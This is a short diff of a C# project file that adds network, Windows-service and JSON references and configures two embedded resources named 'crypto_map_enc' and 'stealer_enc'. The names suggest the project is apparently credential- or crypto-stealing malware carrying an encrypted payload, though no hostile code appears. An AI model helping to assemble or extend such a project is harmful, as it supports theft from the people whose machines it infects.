@@ -15,11 +15,21 @@
     <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Drawing" />
     <Reference Include="System.Management" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.ServiceProcess" />
   </ItemGroup>
 
   <ItemGroup>
-    <EmbeddedResource Include="crypto_map_enc" />
-    <EmbeddedResource Include="stealer_enc" />
+    <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <EmbeddedResource Include="crypto_map_enc">
+      <LogicalName>crypto_map_enc</LogicalName>
+    </EmbeddedResource>
+    <EmbeddedResource Include="stealer_enc">
+      <LogicalName>stealer_enc</LogicalName>
+    </EmbeddedResource>
   </ItemGroup>
 
 </Project>
